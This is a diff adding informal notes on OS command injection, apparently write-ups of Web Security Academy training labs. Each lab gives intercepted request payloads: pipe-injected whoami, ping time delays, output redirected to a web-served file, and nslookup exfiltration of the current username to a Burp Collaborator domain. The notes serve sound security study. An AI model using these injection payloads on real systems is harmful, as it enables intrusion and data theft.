@@ -1,0 +1,79 @@
+
+                                 OS COMMAND INJECTION
+                                 ====================
+
+
+
+ USEFUL COMMAND FOR CMD INJECTION
+ --------------------------------
+ Purpose of command 	     Linux 	         Windows
+ -------------------         -----           -------
+Name of current user 	     whoami 	     whoami
+Operating system 	         uname -a 	     ver
+Network configuration 	     ifconfig 	     ipconfig /all
+Network connections 	     netstat -an 	 netstat -an
+Running processes 	         ps -ef 	     tasklist 
+
+
+
+ Lab: OS command injection, simple case
+ ----------------------------------------
+  1. the vuln is at checkstock
+  2. so i intercept with burp and modify like this
+  [productId=2&storeId=1|whoami]  ;whoami is also available
+  3. BOOM!
+
+
+
+Lab: Blind OS command injection with time delays
+-------------------------------------------------
+1. The vuln is at the feedback function
+2. so same as always, intercept with burp and inject at the end of query
+doesn't work 
+
+csrf=FIBzhPIhhne0KMeVcqRobmgoqlCXwUCk&name=hacker&email=a%40mail.com&subject=love&message=love+you+||ping+-c+10+127.0.0.1||
+
+3. so i change the place to inject , and works at email like that
+csrf=FIBzhPIhhne0KMeVcqRobmgoqlCXwUCk&name=hacker&email=a%40mail.com||+ping+-c+10+127.0.0.1||&subject=love&message=love+you+
+4.BOOM!
+
+
+
+Lab: Blind OS command injection with output redirection
+-------------------------------------------------------
+1. The vlun is inside the feedback function
+2. so in the burpsuite, there is not output response becuz blind
+3. so we have to output the the cmd request like that [whoami>/var/www/images/out.txt]
+4. so the payload is like that [csrf=K2F0M9kdWv9TkDZNHrnAncwFdvgN97ER&name=asdfads&email=||whoami>/var/www/images/out.txt||&subject=asdfasd&message=asdffasdfsadf]
+
+5. open a image file from the site becuz we created the output file in it
+then change the file_name
+
+[https://0ace001003ed3349804d625d00a000bc.web-security-academy.net/image?filename=whoami.txt]
+
+6. BOOM!
+
+
+
+
+Blind OS command injection with out-of-band data exfiltration
+-------------------------------------------------------------
+1. The vuln is in the feedback function
+2. so intercept with burp and test simple payload, but it doesn't work
+3. so we try to use out of band technique with burpcollaborator
+4. payload => [csrf=YpN6QOE8AJbdSQwoGJ1yvNDj8Bgkqo1C&name=asdfasd&email=a%40mail.com||nslookup+`whoami`.burpcollaborator.subdomain.com||&subject=asdfsd&message=adsfsadf]
+5. when i check the burp collaborator, [ae-{peter-wFUz6l}-randomwords]
+6. BOOM!
+
+
+
+Lab: Blind OS command injection with out-of-band interaction
+------------------------------------------------------------
+1. The vuln is in the feedback function
+2. so same as always , firstly i test the simple but doesn't work
+3. so i try out of band technique , with 
+payload =>   [csrf=YpN6QOE8AJbdSQwoGJ1yvNDj8Bgkqo1C&name=asdfasd&email=a%40mail.com||nslookup+.burpcollaborator.subdomain.com||&subject=asdfsd&message=adsfsadf]
+4. and when i check the burpcollaborator, it response back
+5. BOOM!
+
+
